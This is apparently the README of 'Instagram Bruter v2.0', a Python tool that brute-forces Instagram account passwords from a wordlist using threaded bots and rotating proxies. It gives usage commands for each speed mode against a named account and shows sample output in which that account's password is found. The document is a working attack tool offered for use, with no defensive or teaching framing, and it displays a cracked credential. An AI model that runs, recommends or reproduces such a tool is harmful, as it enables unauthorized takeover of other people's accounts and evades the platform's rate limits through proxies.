# Instagram Bruter *v2.0*

Re-engineered to work **without** TOR<br>
__Usage:__ `python instagram.py <username> <wordlist> -m <mode>`

### Requirements
- Python *v2.x* **|** *v3.x*
- ~~Kali Linux 2.0~~
- ~~TOR~~

### Help
```
C:\Users\Mohamed\Desktop\Instagram>python instagram.py -h
usage: instagram.py [-h] [-m MODE] username wordlist

positional arguments:
  username              email or username
  wordlist              password list

optional arguments:
  -h, --help            show this help message and exit
  -m MODE, --mode MODE  modes; 0: 8bots, 1: 4bots, 2: 2bots, 3: 1bot
```

### Bots(Threads)
- 1 bot: 16 passwords at a time
- 2 bots: 32 passwords at a time
- 4 bots: 64 passwords at a time
- 8 bots: 128 passwords at a time

### Modes
- 0: 8 bots
- 1: 4 bots
- 2: 2 bots
- 3: 1 bot

### Chill mode
This mode uses only 1 bot, or 16 passwords at a time.
```
C:\Users\Mohamed\Desktop\Instagram>python instagram.py Sami09.1 pass.lst -m 3
```

### Moderate mode 1
This mode uses 2 bots, or 32 passwords at a time.
```
C:\Users\Mohamed\Desktop\Instagram>python instagram.py Sami09.1 pass.lst -m 2
```

### Moderate mode 2
This mode uses 4 bots, or 64 passwords at a time.
```
C:\Users\Mohamed\Desktop\Instagram>python instagram.py Sami09.1 pass.lst -m 1
```

### Savage mode
This mode uses 8 bots, or 128 passwords at a time.<br>
Only use this mode when you have to, proxies are limited so save some **p**__****__ for the rest of us
```
C:\Users\Mohamed\Desktop\Instagram>python instagram.py Sami09.1 pass.lst -m 0
```

### If you don't specify a mode, then mode is set to 2

### Run
```
[-] Proxy-IP: 125.25.80.39[Thailand]
[-] Wordlist: pass.lst
[-] Username: Sami09.1
[-] Password: 31
[-] Attempts: 15
[-] Proxies: 334
[-] Bots: 2
```

### Stop
```
[-] Proxy-IP: 37.145.33.107[Poland]
[-] Wordlist: pass.lst
[-] Username: Sami09.1
[-] Password: Sami123
[-] Attempts: 97
[-] Proxies: 4
[-] Bots: 2

[!] Password Found
[+] Username: Sami09.1
[+] Password: Sami123
```
